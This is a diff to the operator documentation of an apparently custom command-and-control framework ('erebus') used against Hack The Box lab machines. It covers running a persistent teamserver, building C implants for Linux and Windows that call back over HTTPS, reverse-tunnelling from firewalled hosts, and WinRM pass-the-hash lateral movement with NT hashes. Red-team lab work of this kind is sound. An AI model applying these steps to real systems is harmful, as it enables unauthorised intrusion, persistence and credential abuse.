@@ -39,15 +39,18 @@ Example lines:
 
 | Command | What it starts |
 | --- | --- |
-| `erebus serve` | Unified teamserver + default HTTPS implant listener + gRPC operator API |
-| `erebus teamserver` / `./build/teamserver` | Same control plane (legacy binary name) |
+| `erebus teamserver` | Daemon: HTTPS implant listener + gRPC. Survives stdin EOF. **Use this for HTB C2.** |
+| `erebus serve` | Teamserver + operator REPL. REPL/stdin EOF does **not** stop C2 (SIGINT/SIGTERM does). |
+| `erebus serve --teamserver` | Same as `erebus teamserver` |
 | HTTPS listener port | Prefer **≥1024** (e.g. `:8443`) for rootless ops |
 
 ```bash
 make erebus
-./build/erebus serve
+./build/erebus teamserver          # keep C2 up (nohup / tmux / detached SSH)
 # gRPC often 127.0.0.1:50051; HTTPS implant port from config / flags (lab: 8443)
-./build/erebus certs seats   # operator + approver for dual-control oneshots
+./build/erebus certs seats         # operator + approver for dual-control oneshots
+# other terminal:
+./build/erebus operator            # REPL; closing it leaves teamserver running
 ```
 
 ## Firewall (operator host)
@@ -87,13 +90,20 @@ make implant-c-linux \
 make implant-c CALLBACK_URL=https://YOUR_C2:8443 \
   CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
 
-# Or generate (default language c for Windows)
+# Linux primary (C) — default after foothold on Linux HTB
+make implant-c-linux CALLBACK_URL=https://YOUR_C2:8443 \
+  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
+# Firewalled box: CALLBACK_URL=https://127.0.0.1:8443 + htb_reverse_tunnel.sh
+
+# Or generate (empty language → c for both windows and linux)
 # generate --os windows --arch amd64 --callback https://… --language c
+# generate --os linux  --arch amd64 --callback https://… --language c
 ```
 
 - Empty implant ID/secret → **fail closed** at build/load  
 - HTTPS without CA pin → fail closed for C implant  
-- Lab sleep: **≥500 ms** (ms timestamps; sub-second OK)
+- Lab sleep: **≥500 ms** (ms timestamps; sub-second OK)  
+- Go Linux: **fallback only** (e.g. reverse SOCKS until C M4c lands) — see `docs/plans/SPRINT_L_C_LINUX.md`
 
 ## WinRM PTH (A.1 notes)
 
@@ -105,9 +115,9 @@ lateral winrm <host> "whoami" --user U --domain DOM --hash <32-hex-NT>
 | Path | Message encryption | Notes |
 | --- | --- | --- |
 | Password | **Yes** (NTLM seal via masterzen Encryption) | Prefer when password is available |
-| Hash (PTH) | **Yes** (NTLM Sign/Seal + SPNEGO multipart) | Domain-aware TYPE3; seals when host negotiates Sign/Seal (`AllowUnencrypted=false`) |
+| Hash (PTH) | **Yes** (NTLM Sign/Seal + SPNEGO multipart) | Domain-aware TYPE3; **one flow** — seal if negotiated, no seal→plain retry. Sequential commands reuse the same WinRM session. |
 
-On 401, errors hint domain format (NETBIOS + 32-hex NT). Live GOAD/pypsrp parity remains eng-verify (`docs/C_IMPLANT_LAB_CHECKLIST.md` §5).
+On failure, errors include `pth_layer=` (`transport` / `http_negotiate` / `ntlm_handshake` / `key_derivation` / `sign_seal` / `winrm_mime` / `session_lifecycle`). Day-3 gate: name the layer before more PTH feature work. Live GOAD/pypsrp parity remains eng-verify (`docs/C_IMPLANT_LAB_CHECKLIST.md` §5).
 
 ## Dual-seat oneshots
 
